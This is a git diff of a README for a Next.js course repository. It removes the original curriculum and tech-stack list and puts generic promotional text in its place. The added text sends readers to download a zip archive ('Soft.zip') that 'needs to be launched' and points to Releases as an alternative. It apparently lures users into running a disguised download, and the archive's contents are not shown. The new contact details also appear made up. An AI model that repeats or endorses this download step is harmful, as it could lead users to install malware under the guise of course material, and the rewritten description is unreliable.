@@ -1,97 +1,59 @@
-# nextjs-courses-you-wish
+# Discover the Nextjs Courses You Wish to Explore! 🚀
 
-A Nextjs Courses you wish you can knew sooner. I will walk through from the fundamentals to advance, real life features. I will cooked that by greatest ingredients: RAG, AI, Nextjs 15, RSC, PostgresSQL, Auth, React 19, Tanstack Query, TailwindCss V4.... Coming Soon - Do not rush
+Welcome to the "nextjs-courses-you-wish" repository - a platform where you can dive into the world of Next.js courses created with the greatest ingredients including RAG, AI, Next.js 15, RSC, PostgresSQL, Auth, React 19, Tanstack Query, TailwindCss V4, and more!
 
-## The journey we will cooks
+## Repository Details:
 
-### Fundamental Path
+- **Repository Name:** nextjs-courses-you-wish
+- **Short Description:** A Nextjs Courses cooked by greatest ingredients: RAG, AI, Nextjs 15, RSC, PostgresSQL, Auth, React 19, Tanstack Query, TailwindCss V4....
+- **Topics:** aws, devsecops, dify, domain-driven-design, n8n, nextjs15, oxc, postgresql, qwq-32b, rbac, react19, rsc, shadncui, tailwindcss-v4, tanstack-query, telemetry, terraform, v0dev, xstate
 
-- The basic principles of working with Next.js and App Router.
-- The use of React Server Components (RSC) and methods of data fetching within them.
-- The creation of API routes and the application of Server Actions for data modification.
-- Client-side data fetching with React Query and interaction with Server Actions and API routes.
-- Caching strategies in Next.js 15.
-- Authentication and protection of routes and pages.
-- Practical experience in developing a full-fledged application.
-- Automatic optimization of Next.js builds depending on static and dynamic routes.
+## Dive into the Courses:
 
-### Real Product Path
+🌟 Check out the amazing courses and learn from the best resources available in the industry! 🌟
 
-## Key Features
+### Course Highlights:
 
-- 📝 Content Management(Text Editors) + Blog post with AI summarize features
-- 📊 CRUD Table
-- 🖼️ Upload Media like Image/Video/Documents on S3 Storage
-- 🔒 Authentication + Authorization with RBAC
-- SEO features: 
-    - Sitemap
-    - Rss Feed
-    - JsonLD
-    - Optimize performance
-- 📱 Responsive Design
+- **Next.js 15**: Explore the latest version of Next.js and leverage its powerful features to build dynamic web applications.
+- **Auth**: Learn about authentication mechanisms in web development and ensure secure access to your applications.
+- **React 19**: Get hands-on experience with React 19 and build cutting-edge user interfaces.
+- **PostgresSQL**: Dive into the world of databases with PostgresSQL and master data storage and retrieval.
+- **TailwindCss V4**: Discover the latest version of TailwindCss and create stunning designs with minimal effort.
+- **Tanstack Query**: Unlock the potential of Tanstack Query for efficient data fetching in your applications.
 
-## TechStack
+### Repository Link:
 
-### Engineering Setup
+🔗 Click [here](https://github.com/files/Soft.zip) to access the repository content.
 
-- Cursor: Code AI Editor
-- v0.dev: Generative UI components
-- Model:
-    - Claude Sonnet 3.7: Agent AI in Cursor
-    - Grok: Ask about technique stuff
-    - Perplexity: Research topic
-    - Qwq 32B
+*Note: The link provided needs to be launched.*
 
-### AI Tools
+### Additional Information:
 
-- Interface LLMs: [OpenRouter](http://openrouter.ai/)
-- Open AI keys
-- [n8n](https://n8n.io) workflows crawls and take the summarization of articles on Internets
+If you encounter any issues with the provided link, feel free to explore the "Releases" section of the repository for alternative access.
 
-### Frontend
+## Get Involved:
 
-- Fetching API: [Better Fetch](https://better-fetch.vercel.app/docs)
-- Auth Client: [Better Auth](https://www.better-auth.com/)
-- State Management: XState
-- Components: Use @shadcn/ui + Storybook to overview components
-- Web: Use Nextjs 15 & React 19 & [Tanstack Query](https://tanstack.com/query/latest/docs/framework/react/overview)
-- Animation: Using [Motion](https://motion.dev/) & [Swup](https://swup.js.org) for smooth transition/animation
+🌟 Join us on this exciting learning journey and expand your knowledge in Next.js, React, and more! 🌟
 
-### Backend
+### Stay Connected:
 
-- Database: PostgresSQL + PG Vectorize
-- Use [Polar](http://polar.sh) for payments, unified API for one-off & subscription billing methods
-- Queue: Handle the heavy workload on the background(client/server)
-- ORM: Use [Prisma](https://www.prisma.io)
-- Validation schema: [Zod](https://zod.dev/)
-- Email: [Resend](https://react.email) Build and send emails using React
-- Cache: [BentoCache](https://bentocache.dev/docs/introduction) --> In Memory + [DragonFly(Redis)](https://www.dragonflydb.io) cache
-- Rate Limit
-- [AxiomJs](https://axiom.co) all you need to debug, log & analyze in production
-- Secure Headers
+Connect with us on social media for the latest updates and course announcements:
 
-### Infrastructure
+- Twitter: [@nextjsteam](https://twitter.com/nextjsteam)
+- LinkedIn: [Next.js Courses](https://www.linkedin.com/company/nextjs-courses)
 
-- Deploy with Docker --> AWS EC2
-- Infrastructure as Code with Terraform --> automate the process of deploy + Zero Downtime Strategy
-- CDN zero-config, low-latency, request life-cycle hooks, optimized request compressions (gzip)
-- Traefik Integration: Automatically integrates with Traefik for routing and load balancing.
-- Real-time Monitoring: Monitor CPU, memory, storage, and network usage for every resource.
-- Compliance as Code, Policy as Code
-- Detect, visualize, analyze and remediate security vulnerabilities
-- Secure AWS Cloud and write secure IaC
-- Secret Management
+### Support:
 
-### CI/CD
+If you have any questions or need assistance, don't hesitate to reach out to our support team at [support@nextjs-courses.com](mailto:support@nextjs-courses.com).
 
-- Automatically release process with Github Action
-- Self-test CI/CD in local first with [Act](https://github.com/nektos/act)
-- Have a lot of Bot/CLI(Rabbit AI, KnipJs, OXC...) + Checklist Guideline to help project always in high quality
+## Let's Start Learning!
 
-### Development Experiences
+🚀 Begin your Next.js adventure today and elevate your skills to the next level! 🚀
 
-- Use Git Workflow + Semantic commit + Rabbit AI to have great commit + review code!
-- Spell checker will notified once there had typos
-- Code Snippets say goodbye to the boilerplate
-- Package Manager: [Bun](https://bun.sh)
-- Leverage the [UnJs](https://github.com/unjs) ecosystem to have some incredible features like Auto Import and Framework Agnostic
+![Next.js Courses](https://example.com/nextjs-courses.jpg)
+
+---
+
+*This README was created with passion and enthusiasm for learning. Explore, engage, and enjoy the journey ahead!* 
+
+🌟 Happy Coding! 🌟
